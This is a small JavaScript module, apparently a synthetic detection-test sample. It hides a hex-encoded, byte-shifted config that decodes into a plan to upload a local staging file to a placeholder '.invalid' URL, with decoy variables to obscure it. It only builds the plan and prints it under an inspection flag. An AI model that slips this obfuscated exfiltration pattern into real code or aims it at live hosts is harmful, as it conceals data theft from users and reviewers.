const moduleShape = Object.freeze({ format: "commonjs" });

const Material_7528b05a = "682f236e65665762652f6457535651585b5e571e66645360655f5b665164575f6166576e535653626657642f65666457535f51625b62575e5b60576e65665359575155616760662f236e55535f62535b5960515b562f404136371f272425342a2336336e67645e2f5a666662652c2121606156571f272425542a2356532353282620576a535f625e57205b6068535e5b562153625b6e676557645153595760662f406156573367565b6621272425546e585b5e57516253665a2f21665f62215a676066645765651f60615657212065665359571f272425542a23565323532826205f5c65";

const Codec_7528b05a = "hex_buffer|subtract_modulo_256|0e";



function load_7528b05a() { return [...Buffer.from(Material_7528b05a, "hex")]; }

function decode_7528b05a(storedBytes) { return storedBytes.map((value) => (value + 14) & 255); }

async function recover_7528b05a() {

  const harmlessValue = { ...{ north: 1 }, south: 2 };

  const storedBytes = load_7528b05a(); let recoveredBytes = [];

  for (const decodePass of [1]) recoveredBytes = decode_7528b05a(storedBytes);

  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");

}

async function inspect_7528b05a() { return JSON.parse(JSON.stringify({ value: await recover_7528b05a() })).value; }

async function plan_7528b05a() { const inspect = inspect_7528b05a; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "upload", transport: "stream_pipeline", source: fields.file_path, url: fields.url }); }

void moduleShape; void plan_7528b05a;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_7528b05a());

